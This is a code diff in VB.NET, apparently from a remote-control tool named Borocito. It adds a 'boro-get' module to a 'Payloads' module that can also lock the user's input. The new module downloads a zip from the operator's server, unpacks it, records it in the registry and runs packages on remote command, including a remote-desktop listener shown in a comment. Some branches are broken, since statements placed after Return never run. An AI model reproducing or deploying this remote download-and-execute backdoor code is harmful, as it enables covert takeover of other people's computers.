@@ -1,5 +1,7 @@
 ﻿Imports System.IO
 Imports System.Runtime.Serialization.Formatters.Binary
+Imports Microsoft.Win32
+Imports System.IO.Compression
 Module Payloads
     Declare Function BlockInput Lib "user32" (ByVal fBlockIt As Boolean) As Boolean
     Sub Inputs(ByVal Status As Boolean)
@@ -147,4 +149,108 @@ Module Payloads
             AddToLog("Extractor@Payloads", "Error" & ex.Message, True)
         End Try
     End Sub
+End Module
+Module BOROGET
+    Private DIRBoroGetInstallFolder As String = DIRCommons & "\boro-get"
+    Private zipPackageFile As String = DIRBoroGetInstallFolder & "\boro-get.zip"
+
+    Function BORO_GET_ADMIN(ByVal command As String) As String
+        Try
+            'EJEMPLOS
+            '   PACKET boro-get RMTDSK|True|-ServerIP=0.0.0.0 -ServerPort=15243
+            '   INSTALL boro-get install
+            '   UNINSTALL boro-get uninstall
+            '   SET boro-get set boro-get|boro-getPath
+            Dim boroGETcommand As String = command.Replace("boro-get", Nothing)
+            boroGETcommand = boroGETcommand.Trim()
+            If boroGETcommand = "install" Then
+                Return InstallBOROGET()
+            ElseIf boroGETcommand = "uninstall" Then
+                Return UninstallBOROGET()
+            ElseIf boroGETcommand = "status" Then
+                Dim check_boroget As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
+                If check_boroget Is Nothing Then
+                    Return "No installed"
+                Else
+                    If check_boroget.GetValue("boro-get") = Nothing Then
+                        Return "No installed"
+                    Else
+                        Return "Installed! (" & check_boroget.GetValue("Name") & " " & check_boroget.GetValue("Version") & ")"
+                    End If
+                End If
+            ElseIf boroGETcommand = "set" Then
+                Return "Setting..."
+                Dim args() As String = boroGETcommand.Split("|")
+                SetBOROGET(args(1), args(2))
+            Else
+                'paquete a instalars
+                Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
+                Process.Start(regKey.GetValue("boro-get"), boroGETcommand)
+                Return "Processing Package (" & boroGETcommand & ")"
+            End If
+        Catch ex As Exception
+            AddToLog("BORO_GET_ADMIN@BOROGET", "Error" & ex.Message, True)
+        End Try
+    End Function
+
+    Function InstallBOROGET() As String
+        Try
+            If Not My.Computer.FileSystem.DirectoryExists(DIRBoroGetInstallFolder) Then
+                My.Computer.FileSystem.CreateDirectory(DIRBoroGetInstallFolder)
+            End If
+            If My.Computer.FileSystem.FileExists(zipPackageFile) Then
+                My.Computer.FileSystem.DeleteFile(zipPackageFile)
+            End If
+            'Descargar desde el servidor
+            My.Computer.Network.DownloadFile(HttpOwnerServer & "/Boro-Get/boro-get.zip", zipPackageFile)
+            'Instalar
+            ZipFile.ExtractToDirectory(zipPackageFile, DIRBoroGetInstallFolder)
+            'Registra
+            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
+            If regKey Is Nothing Then
+                Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito\\boro-get")
+                regKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
+            End If
+            regKey.SetValue("boro-get", DIRBoroGetInstallFolder & "\boro-get.exe")
+            regKey.SetValue("Name", GetIniValue("ASSEMBLY", "Name", DIRBoroGetInstallFolder & "\boro-get.txt"))
+            regKey.SetValue("Version", GetIniValue("ASSEMBLY", "Version", DIRBoroGetInstallFolder & "\boro-get.txt"))
+            regKey.SetValue("RepoListURL", GetIniValue("CONFIG", "RepoList", DIRBoroGetInstallFolder & "\boro-get.txt"))
+            Return "boro-get has been installed!"
+        Catch ex As Exception
+            Return "Error installing boro-get. " & ex.Message
+            AddToLog("Install@BOROGET", "Error" & ex.Message, True)
+        End Try
+    End Function
+    Function UninstallBOROGET() As String
+        Try
+            'Eliminar
+            If My.Computer.FileSystem.DirectoryExists(DIRBoroGetInstallFolder) Then
+                My.Computer.FileSystem.DeleteDirectory(DIRBoroGetInstallFolder, FileIO.DeleteDirectoryOption.DeleteAllContents)
+            End If
+            'Finalizar
+            Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
+            regKey.SetValue("boro-get", "")
+            regKey.SetValue("Name", "")
+            regKey.SetValue("Version", "")
+            regKey.SetValue("RepoListURL", "")
+            Return "boro-get has been uninstalled!"
+        Catch ex As Exception
+            Return "Error uninstalling boro-get. " & ex.Message
+            AddToLog("Uninstall@BOROGET", "Error" & ex.Message, True)
+        End Try
+    End Function
+    Function SetBOROGET(ByVal regKey As String, ByVal regValue As String) As String
+        Try
+            Dim RegeditBoroGet As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
+            If RegeditBoroGet Is Nothing Then
+                Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito\\boro-get")
+                RegeditBoroGet = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
+            End If
+            RegeditBoroGet.SetValue(regKey, regValue)
+            Return "Key: " & regKey & " Value: " & regValue & " has been setted!"
+        Catch ex As Exception
+            Return "Error setting registry. " & ex.Message
+            AddToLog("Set@BOROGET", "Error" & ex.Message, True)
+        End Try
+    End Function
 End Module
